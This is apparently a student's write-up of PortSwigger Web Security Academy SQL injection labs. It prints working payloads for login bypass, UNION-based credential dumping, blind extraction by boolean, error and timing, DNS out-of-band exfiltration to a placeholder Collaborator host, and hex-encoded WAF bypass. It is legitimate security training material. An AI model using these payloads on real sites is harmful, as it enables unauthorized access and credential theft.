# PortSwigger Web Security Academy Labs
### Solved by: Naman Yuvraj

B.Tech Cybersecurity Engineering Student | Application Security Learner  
**College:** Rungta College of Engineering and Technology, Bhilai  
**Tools:** Burp Suite Professional | Kali Linux | Firefox

---

## Progress Tracker

| Topic | Total Labs | Completed | Status |
|-------|-----------|-----------|--------|
| SQL Injection | 18 | 18 | ✅ Complete |
| Authentication | 14 | 6 | 🔄 In Progress |
| Access Control | 13 | 0 | ⏳ Upcoming |
| XSS | 30 | 0 | ⏳ Upcoming |
| CSRF | 8 | 0 | ⏳ Upcoming |
| SSRF | 7 | 0 | ⏳ Upcoming |
| XXE | 9 | 0 | ⏳ Upcoming |
| **Total** | **99** | **24** | |

---

## SQL Injection Labs

### Lab 1 — SQL Injection in WHERE Clause (Hidden Data) ✅
**Difficulty:** Apprentice  
**Vulnerability:** SQL Injection in product category filter

**What I did:**
- Opened Burp Suite and intercepted the product category GET request
- Found category parameter vulnerable to SQL injection
- Injected payload to make WHERE clause always true
- Retrieved all hidden and unreleased products from database

**Payload Used:**
```
'1 or 1=1--
```

**What I Learned:**
- How SQL injection works in GET parameters
- OR 1=1 makes the entire WHERE clause always true
- Double dash (--) comments out the rest of SQL query
- Hidden database records can be retrieved via SQLi

---

### Lab 2 — SQL Injection Login Bypass ✅
**Difficulty:** Apprentice  
**Vulnerability:** SQL Injection in login form

**What I did:**
- Intercepted the login POST request in Burp Suite
- Modified the username field with SQL injection payload
- Successfully logged in as administrator without knowing password

**Payload Used:**
```
administrator' or 1=1--
```

**What I Learned:**
- SQL comment (--) ignores everything after it including password check
- Authentication can be completely bypassed using SQLi
- Never trust user input in login forms
- Parameterized queries prevent this attack

---

### Lab 3 — SQL Injection — Oracle Database Version ✅
**Difficulty:** Practitioner  
**Vulnerability:** UNION based SQL Injection on Oracle database

**What I did:**
- Used ORDER BY to determine number of columns returned
- Used UNION SELECT with FROM DUAL (required in Oracle)
- Queried v$version table to extract Oracle database version

**Payloads Used:**
```
-- Step 1: Find number of columns
'+ORDER+BY+1--
'+ORDER+BY+2--
'+ORDER+BY+3--   (error appeared = 2 columns confirmed)

-- Step 2: Confirm UNION works with Oracle syntax
'+UNION+SELECT+NULL,NULL+FROM+DUAL--

-- Step 3: Extract Oracle version
'+UNION+SELECT+BANNER,NULL+FROM+v$version--
```

**What I Learned:**
- Oracle database requires FROM clause in every SELECT
- FROM DUAL used when no real table needed
- v$version table stores Oracle database version info
- Oracle syntax differs significantly from MySQL/MSSQL

---

### Lab 4 — SQL Injection — MySQL and Microsoft Database Version ✅
**Difficulty:** Practitioner  
**Vulnerability:** UNION based SQL Injection on MySQL/MSSQL database

**What I did:**
- Identified MySQL/Microsoft database from error messages
- Used UNION attack to extract database version
- Used @@version global variable to get version string

**Payloads Used:**
```
-- Step 1: Find number of columns
'+ORDER+BY+1--
'+ORDER+BY+2--
'+ORDER+BY+3--   (error = 2 columns)

-- Step 2: Find which column is string type
'+UNION+SELECT+'a',NULL--
'+UNION+SELECT+NULL,'a'--

-- Step 3: Extract version
'+UNION+SELECT+@@version,NULL--
```

**What I Learned:**
- @@version works in both MySQL and Microsoft SQL Server
- MySQL uses # or -- for comments
- Different databases have different version functions
- Error messages reveal which database is being used

---

### Lab 5 — SQL Injection — Database Contents on Non-Oracle ✅
**Difficulty:** Practitioner  
**Vulnerability:** SQL Injection with full database enumeration

**What I did:**
- Listed all tables using information_schema
- Found the users table with login credentials
- Extracted column names from users table
- Retrieved administrator username and password

**Payloads Used:**
```
-- Step 1: List all tables
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--

-- Step 2: List columns of users table
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns
+WHERE+table_name='users_abcdef'--

-- Step 3: Extract credentials
'+UNION+SELECT+username,password+FROM+users_abcdef--
```

**What I Learned:**
- information_schema is a metadata database in MySQL/MSSQL/PostgreSQL
- Full database structure can be mapped using SQLi
- Attacker can extract any data from any table
- Critical credentials stored in plaintext are extremely dangerous

---

### Lab 6 — SQL Injection — Database Contents on Oracle ✅
**Difficulty:** Practitioner  
**Vulnerability:** SQL Injection with Oracle database enumeration

**What I did:**
- Listed all tables using Oracle specific all_tables view
- Found users table and queried all_tab_columns for column names
- Extracted administrator credentials successfully

**Payloads Used:**
```
-- Step 1: List all Oracle tables
'+UNION+SELECT+table_name,NULL+FROM+all_tables--

-- Step 2: List columns of users table
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns
+WHERE+table_name='USERS_ABCDEF'--

-- Step 3: Extract credentials
'+UNION+SELECT+USERNAME,PASSWORD+FROM+USERS_ABCDEF--
```

**What I Learned:**
- Oracle uses all_tables instead of information_schema.tables
- Oracle uses all_tab_columns instead of information_schema.columns
- Oracle table and column names are stored in UPPERCASE
- Each database has its own metadata tables

---

### Lab 7 — UNION Attack: Number of Columns ✅
**Difficulty:** Practitioner  
**Vulnerability:** UNION based SQL Injection — column count

**What I did:**
- Used ORDER BY technique to determine exact column count
- Switched to UNION SELECT NULL method to confirm
- Identified that query returns exactly 2 columns

**Payloads Used:**
```
-- Method 1: ORDER BY (increment until error)
'+ORDER+BY+1--   (no error)
'+ORDER+BY+2--   (no error)
'+ORDER+BY+3--   (error = 2 columns confirmed)

-- Method 2: UNION SELECT NULL (add NULLs until works)
'+UNION+SELECT+NULL--         (error)
'+UNION+SELECT+NULL,NULL--    (worked = 2 columns)
```

**What I Learned:**
- UNION attack requires matching number of columns
- ORDER BY is fastest method to find column count
- NULL works for any data type unlike specific values
- Error messages confirm when column count is wrong

---

### Lab 8 — UNION Attack: Finding Text Column ✅
**Difficulty:** Practitioner  
**Vulnerability:** UNION based SQL Injection — text column identification

**What I did:**
- Already knew 2 columns exist from previous technique
- Tested each column position with a string value
- Identified which column accepts and displays string data

**Payloads Used:**
```
-- Test column 1 for string
'+UNION+SELECT+'abcdef',NULL--   (error = not string)

-- Test column 2 for string
'+UNION+SELECT+NULL,'abcdef'--   (worked = column 2 is string)
```

**What I Learned:**
- Not all database columns can hold string data
- Must identify correct column before extracting data
- Integer columns reject string values causing errors
- Only string-compatible columns display injected data

---

### Lab 9 — UNION Attack: Retrieving Data From Other Tables ✅
**Difficulty:** Practitioner  
**Vulnerability:** UNION based SQL Injection — cross table data extraction

**What I did:**
- Confirmed 2 columns exist and both accept strings
- Directly queried users table using UNION
- Extracted all usernames and passwords in one query
- Logged in as administrator with extracted credentials

**Payload Used:**
```
'+UNION+SELECT+username,password+FROM+users--
```

**What I Learned:**
- UNION allows reading data from completely different tables
- Both columns were string type making extraction easier
- Real world impact: complete account takeover
- This is why SQL injection is ranked #1 in OWASP Top 10

---

### Lab 10 — UNION Attack: Multiple Values in Single Column ✅
**Difficulty:** Practitioner  
**Vulnerability:** UNION based SQL Injection — string concatenation

**What I did:**
- Found only one string column available in query
- Used string concatenation to combine username and password
- Used tilde (~) as separator to split values in output
- Successfully extracted all credentials in one column

**Payloads Used:**
```
-- Oracle database syntax:
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--

-- MySQL database syntax:
'+UNION+SELECT+NULL,CONCAT(username,'~',password)+FROM+users--
```

**What I Learned:**
- String concatenation bypasses single column limitation
- Oracle uses || operator for concatenation
- MySQL uses CONCAT() function for concatenation
- Separator character helps identify username vs password in output

---

### Lab 11 — Blind SQL Injection with Conditional Responses ✅
**Difficulty:** Practitioner  
**Vulnerability:** Blind SQL Injection using boolean responses

**What I did:**
- Found TrackingId cookie was vulnerable to Blind SQLi
- Used "Welcome back" message as true/false indicator
- Confirmed users table and administrator user exist
- Found exact password length using binary search
- Extracted full password character by character using Burp Intruder

**Payloads Used:**
```
-- Step 1: Confirm Blind SQLi exists
xyz' AND '1'='1    --> Welcome back shown (TRUE)
xyz' AND '1'='2    --> Welcome back hidden (FALSE)

-- Step 2: Confirm users table exists
xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

-- Step 3: Confirm administrator user exists
xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

-- Step 4: Find password length
xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a
xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a

-- Step 5: Extract each character
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='b
(repeat for each character position)
```

**Burp Suite Intruder Setup Used:**
```
Attack Type  : Cluster Bomb
Payload 1    : Character position (1 to 20)
Payload 2    : Character values (a-z and 0-9)
Grep Match   : Welcome back
Result       : Matched rows = correct characters
```

**What I Learned:**
- Blind SQLi works even when no data displayed on screen
- Boolean based extraction uses true/false application responses
- Password extracted one character at a time using SUBSTRING
- Burp Suite Pro Intruder automates the full extraction
- Blind SQLi is slower but equally dangerous as normal SQLi

---

### Lab 12 — Blind SQLi with Conditional Errors ✅
**Difficulty:** Practitioner  
**Vulnerability:** Blind SQL Injection using error-based responses (Oracle Database)

**What I did:**
- Found that triggering a database error = TRUE condition
- Used TO_CHAR(1/0) to cause divide-by-zero error as true indicator
- Used Sniper attack to find exact password length
- Used Cluster Bomb attack to extract password character by character

**Step 1 — Find Password Length (Sniper Attack):**
```
'AND+(SELECT+CASE+WHEN+LENGTH(password)>1
+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+users
+WHERE+username='administrator')='a'--

Logic:
→ Server Error 500 = condition TRUE (length is greater)
→ Normal response = condition FALSE (length is smaller)
→ Increment number until no error = exact length found
```

**Step 2 — Extract Password (Cluster Bomb Attack):**
```
'AND+(SELECT+CASE+WHEN+SUBSTR(password,§1§,1)='§a§'
+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+users
+WHERE+username='administrator')='a'--

Burp Intruder Setup:
→ Attack Type: Cluster Bomb
→ Payload 1: Character position (1 to 20)
→ Payload 2: a-z and 0-9
→ Filter: Status 500 = correct character
```

**What I Learned:**
- Oracle uses TO_CHAR(1/0) to trigger intentional divide-by-zero error
- Oracle uses SUBSTR() not SUBSTRING() for character extraction
- Error-based blind SQLi uses HTTP status codes as true/false indicator
- Status 500 = condition true, Status 200 = condition false

---

### Lab 13 — Visible Error-Based SQL Injection ✅
**Difficulty:** Practitioner  
**Vulnerability:** SQL Injection leaking data through verbose error messages (PostgreSQL)

**What I did:**
- Used CAST() function to force database to convert string to integer
- Database threw error containing the actual string value
- Error message leaked username and password directly

**Step 1 — Extract Username:**
```
'AND 1=CAST((SELECT username FROM users LIMIT 1)as int)--

Result:
→ Server returned 500 error
→ Error message leaked: "administrator"
→ First username = administrator
```

**Step 2 — Extract Password:**
```
'AND 1=CAST((SELECT password FROM users LIMIT 1)as int)--

Result:
→ Server returned 500 error
→ Error message leaked password directly
→ Password: xeu2fy3zjhnnt1gwnhpvr
```

**What I Learned:**
- CAST() forces type conversion which throws verbose errors
- PostgreSQL error messages sometimes leak actual data values
- LIMIT 1 ensures only one row returned to avoid errors
- Verbose error messages are a serious security misconfiguration
- This is faster than boolean-based blind SQLi

---

### Lab 14 — Blind SQLi Time Delays ✅
**Difficulty:** Practitioner  
**Vulnerability:** Blind SQL Injection using time delays (PostgreSQL)

**What I did:**
- Identified that tracking ID cookie was injectable
- Tested MySQL sleep() function — did not work
- Tested PostgreSQL pg_sleep() function — worked
- Confirmed vulnerability using 10 second response delay

**Payloads Tested:**
```
-- MySQL (did not work):
'||(SELECT sleep(10))--
Response: 330 milliseconds (no delay = not MySQL)

-- PostgreSQL (worked):
'||(SELECT+pg_sleep(10))--
Response: 10,255 milliseconds (10 sec delay = PostgreSQL confirmed)
```

**What I Learned:**
- Time-based blind SQLi works when no output and no errors visible
- Different databases have different sleep functions
- MySQL uses sleep(), PostgreSQL uses pg_sleep()
- Response time is the only indicator in time-based blind SQLi
- Burp Repeater shows response time in milliseconds

---

### Lab 15 — Blind SQLi Time Delays and Data Extraction ✅
**Difficulty:** Practitioner  
**Vulnerability:** Blind SQL Injection — extracting data via time delays (PostgreSQL)

**What I did:**
- Confirmed vulnerability using CASE WHEN with pg_sleep
- Verified administrator user exists in database
- Found exact password length = 20 characters
- Extracted full password using Cluster Bomb attack

**Step 1 — Confirm Vulnerability:**
```
-- TRUE condition (1=1):
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10)
ELSE pg_sleep(0) END)--
Response: 10,567 ms (delayed = confirmed)

-- FALSE condition (1=2):
'||(SELECT CASE WHEN (1=2) THEN pg_sleep(10)
ELSE pg_sleep(0) END)--
Response: 594 ms (no delay = confirmed)
```

**Step 2 — Confirm Administrator Exists:**
```
'||(SELECT+CASE+WHEN+(username='administrator')
+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END FROM users)--

Response: 10,620 ms = administrator exists ✅
```

**Step 3 — Find Password Length:**
```
'||(SELECT+CASE+WHEN+(username='administrator'
AND LENGTH(password)>19)+THEN+pg_sleep(10)
+ELSE+pg_sleep(0)+END FROM users)--
Response: 10,309 ms = password longer than 19 chars ✅

'||(SELECT+CASE+WHEN+(username='administrator'
AND LENGTH(password)>20)+THEN+pg_sleep(10)
+ELSE+pg_sleep(0)+END FROM users)--
Response: 580 ms = NOT longer than 20

Password Length = 20 ✅
```

**Step 4 — Extract Password (Cluster Bomb):**
```
'||(SELECT+CASE+WHEN+(username='administrator'
AND SUBSTRING(password,§1§,1)='§a§')
+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END FROM users)--

Burp Intruder Setup:
→ Attack Type: Cluster Bomb
→ Payload 1: 1 to 20 (character position)
→ Payload 2: a-z and 0-9
→ Filter: Response time > 10000ms = correct character

Extracted Password: nm6ybys9w1hsrggi0e8z ✅
```

**What I Learned:**
- CASE WHEN with pg_sleep gives precise true/false via timing
- Binary search method finds password length efficiently
- Cluster Bomb automates character-by-character extraction
- Response time column in Intruder identifies correct characters
- Time-based extraction is slower but works on any database

---

### Lab 16 — Blind SQLi Out-of-Band Interaction ✅
**Difficulty:** Practitioner  
**Vulnerability:** Blind SQL Injection using DNS out-of-band channel (Oracle)

**What I did:**
- Used Burp Collaborator to generate unique external URL
- Injected XML payload to force Oracle to make DNS lookup
- Confirmed vulnerability when DNS request arrived at Collaborator

**Burp Collaborator Setup:**
```
Step 1 → Burp menu → Burp Collaborator Client
Step 2 → Click "Copy to clipboard"
Step 3 → Unique URL generated: [random].oastify.com
```

**Payload Used:**
```
'+UNION+SELECT+EXTRACTVALUE(xmltype('
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM
"http://YOUR-COLLABORATOR-URL/">
%remote;]>'),'/l')+FROM+dual--

Result:
→ Collaborator received DNS lookup ✅
→ Confirms out-of-band channel works
→ Oracle made external HTTP/DNS request
```

**What I Learned:**
- Out-of-band SQLi used when no visual or timing indicators available
- Burp Collaborator provides external URL to catch server callbacks
- EXTRACTVALUE with XML entity forces Oracle to make DNS request
- oastify.com is Burp Suite's official Collaborator domain
- Oracle's XML processing can trigger external network requests

---

### Lab 17 — Blind SQLi Out-of-Band Data Exfiltration ✅
**Difficulty:** Practitioner  
**Vulnerability:** Blind SQL Injection — password extracted via DNS lookup (Oracle)

**What I did:**
- Used Burp Collaborator URL with password embedded in subdomain
- Oracle made DNS lookup containing administrator password
- Password appeared in Collaborator as part of the domain name

**Payload Used:**
```
'UNION+SELECT+EXTRACTVALUE(xmltype('
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM
"http://'||(SELECT+password+FROM+users
+WHERE+username='administrator')||
'.YOUR-COLLABORATOR-URL/">
%remote;]>'),'/l')+FROM+dual--

How it works:
→ Oracle builds URL with password as subdomain
→ URL becomes: [password].collaborator-url.oastify.com
→ DNS lookup sent to Collaborator
→ Collaborator logs show full domain with password
```

**Result:**
```
Collaborator received DNS request:
→ Subdomain contained the password
→ Extracted Password: ocytv5czb7ske6uk8yob
→ Logged in as administrator successfully ✅
```

**What I Learned:**
- Password embedded in DNS subdomain using string concatenation
- Oracle || operator concatenates password into URL
- DNS exfiltration bypasses all output restrictions completely
- Most powerful blind SQLi — works even with strict firewalls
- Collaborator logs full DNS request including all subdomains

---

### Lab 18 — SQL Injection with Filter Bypass via XML Encoding ✅
**Difficulty:** Practitioner  
**Vulnerability:** SQL Injection bypassing WAF using XML hex encoding

**What I did:**
- Installed HackVector Burp extension for payload encoding
- Found SQL injection in XML-based product stock check feature
- WAF was blocking all normal SQL injection payloads
- Used hex_entities encoding to bypass WAF detection
- Extracted administrator password via UNION attack

**Setup:**
```
Step 1 → Burp Suite → Extender tab
Step 2 → BApp Store → Search "HackVector"
Step 3 → Install HackVector extension
```

**Finding the Injection Point:**
```
→ Add item to cart
→ Click "Check stock" on product page
→ Intercept request in Burp Suite
→ Found XML body with productId parameter
→ Normal SQL payloads blocked by WAF here
```

**Bypassing WAF with Hex Encoding:**
```
Step 1 → Type UNION payload in productId field
Step 2 → Select the payload text in Burp
Step 3 → Right click → Extensions
         → HackVector → hex_entities

Step 4 → Payload gets encoded automatically:
Normal:  UNION SELECT password from users
         where username='administrator'--

Encoded: &#x55;&#x4e;&#x49;&#x4f;&#x4e;...
(WAF cannot recognize encoded SQL keywords)

Step 5 → Send encoded payload
Step 6 → Response contains administrator password
```

**Extracted Password:**
```
bhb1t4qozu37er5esp3x ✅
```

**What I Learned:**
- WAFs detect common SQL keywords like UNION and SELECT
- HTML hex encoding bypasses WAF signature-based detection
- HackVector extension automates encoding directly in Burp
- hex_entities converts each character to HTML hex entity code
- WAF bypass is a critical real-world penetration testing skill
- XML injection points in stock checkers are commonly overlooked

---

## SQL Injection — Complete ✅

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite Professional | Request interception, Repeater, Intruder, Collaborator |
| HackVector Extension | Payload encoding for WAF bypass |
| Kali Linux | Testing environment |
| Firefox | Browser with Burp proxy configured |

---

## Key Takeaways — SQL Injection Module

- SQL Injection is the most critical web vulnerability (OWASP #1)
- Different databases have completely different syntax
- Blind SQLi is equally dangerous even without visible output
- Out-of-band techniques work when everything else fails
- WAFs can be bypassed using encoding techniques
- Burp Suite Pro massively speeds up exploitation with Intruder
- Prevention: Always use parameterized queries and prepared statements
- Input validation alone is never enough to prevent SQL Injection
